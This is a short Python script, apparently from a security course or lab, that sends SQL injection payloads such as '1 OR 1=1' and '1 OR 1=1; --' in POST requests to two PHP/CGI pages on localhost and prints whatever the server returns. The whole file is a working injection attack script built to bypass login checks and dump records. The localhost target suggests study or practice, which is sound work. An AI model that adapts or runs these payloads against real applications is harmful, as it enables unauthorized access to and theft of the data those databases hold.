#!/usr/bin/python3
import subprocess
import sys
import requests

def main():
    # Checking if the file was called with correct usage.
    if (len(sys.argv) != 2):
        print("Usage: ./perform_attack.py <php_file>")
        sys.exit(2)

    file_name = sys.argv[1]

    # First, find the PHP file.
    url = 'http://localhost/' + file_name + '.php'

    # Defining the payload, as well as the step number for each payload.
    data = {}
    if (file_name == "php_practice"):
        data = {
            'student_id': "1 OR 1=1"
        }

    elif (file_name == "cgi-bin/FCCU"):
        data = {
            'id': "1 OR 1=1; --",
            'password': "asdf"
        }

    # Send the POST request.
    response = requests.post(url, data=data)

    # Check if the request was successful.
    if (response.status_code == 200):
        # If the request was successful, return the response.
        print(response.text)
        sys.exit(1)

    # Otherwise, it did not work.
    else:
        print("Error")
        sys.exit(0)

main()
